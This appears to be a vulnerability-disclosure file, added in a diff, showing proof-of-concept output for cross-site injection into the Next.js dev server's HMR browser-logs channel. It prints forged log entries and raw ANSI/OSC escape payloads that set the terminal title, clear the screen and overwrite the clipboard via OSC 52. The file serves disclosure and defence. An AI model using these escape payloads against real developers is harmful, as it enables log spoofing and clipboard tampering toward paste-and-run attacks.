@@ -1,0 +1,56 @@
+======================================================================
+ Next.js next dev - unauthenticated cross-site injection into the
+ HMR 'browser-logs' channel: forged log entries + raw ANSI/OSC escape
+ sequences reach the developer's dev-log file (default) and live
+ terminal (when logging.browserToTerminal is enabled)
+ next@16.3.4   Node v22.22.2   Fri Sep  4 05:33:31 UTC 2026
+======================================================================
+
+--- 1. DEFAULT config (logging.browserToTerminal unset) ---
+    experimental.mcpServer defaults to true, so FileLogger.initialize()
+    activates unconditionally -- file logging is on by default even
+    though terminal echoing is off.
+
+    One hidden cross-site WebSocket message later, .next/dev/logs/next-development.log:
+
+{"timestamp":"00:00:00.933","source":"Server","level":"WARN","message":"⚠ The \"middleware\" file convention is deprecated. Please use \"proxy\" instead.\n\n  To migrate automatically, run:\n  npx @next/codemod@canary middleware-to-proxy .\n\n  Learn more: https://nextjs.org/docs/messages/middleware-to-proxy"}
+{"timestamp":"00:00:01.044","source":"Server","level":"LOG","message":""}
+{"timestamp":"00:00:06.056","source":"Server","level":"LOG","message":"\u001b]0;PWNED-BY-CROSS-SITE-PAGE\u0007\u001b[2J\u001b[H*** THIS LINE WAS INJECTED BY attacker.test VIA A FORGED HMR MESSAGE ***\n\u001b]52;c;cHduZWQtY2xpcGJvYXJkLXdyaXRl\u0007"}
+
+    Forged entry landed, attributed "source":"Server" though it came
+    from an unrelated cross-site page -- entirely fabricated provenance.
+
+--- 2. logging.browserToTerminal: true (documented opt-in feature) ---
+    Same message, same bypass, this time straight to the dev server's
+    OWN stdout (i.e. the developer's live terminal). Raw bytes below,
+    captured by redirecting stdout to a file -- nothing here is
+    JSON-escaped, these are the literal bytes Node's console.log wrote:
+
+0000000   8   m   s       (   n   e   x   t   .   j   s   :       1   4
+0000020   5   8   m   s   ,       a   p   p   l   i   c   a   t   i   o
+0000040   n   -   c   o   d   e   :       1   4   0   m   s   )  \n    
+0000060   G   E   T       /       2   0   0       i   n       3   0   m
+0000100   s       (   n   e   x   t   .   j   s   :       4   m   s   ,
+0000120       a   p   p   l   i   c   a   t   i   o   n   -   c   o   d
+0000140   e   :       2   6   m   s   )  \n   [   s   e   r   v   e   r
+0000160   ]     033   ]   0   ;   P   W   N   E   D   -   B   Y   -   C
+0000200   R   O   S   S   -   S   I   T   E   -   P   A   G   E  \a 033
+0000220   [   2   J 033   [   H   *   *   *       T   H   I   S       L
+0000240   I   N   E       W   A   S       I   N   J   E   C   T   E   D
+0000260       B   Y       a   t   t   a   c   k   e   r   .   t   e   s
+0000300   t       V   I   A       A       F   O   R   G   E   D       H
+0000320   M   R       M   E   S   S   A   G   E       *   *   *  \n 033
+0000340   ]   5   2   ;   c   ;   c   H   d   u   Z   W   Q   t   Y   2
+0000360   x   p   c   G   J   v   Y   X   J   k   L   X   d   y   a   X
+0000400   R   l  \a  \n
+0000404
+
+    Decoded, that is:
+      ESC ]0;PWNED-BY-CROSS-SITE-PAGE BEL   -- OSC 0: set terminal title
+      ESC [2J ESC [H                        -- clear screen, cursor home
+      <arbitrary spoofed text>
+      ESC ]52;c;<base64> BEL                -- OSC 52: WRITE TO SYSTEM CLIPBOARD
+    In any terminal emulator that honours OSC 52 (iTerm2, kitty, foot,
+    WezTerm, tmux-wrapped terminals, and others), this overwrites the
+    developer's clipboard with attacker-chosen data -- a documented
+    stepping stone toward getting a victim to paste-and-run a command.
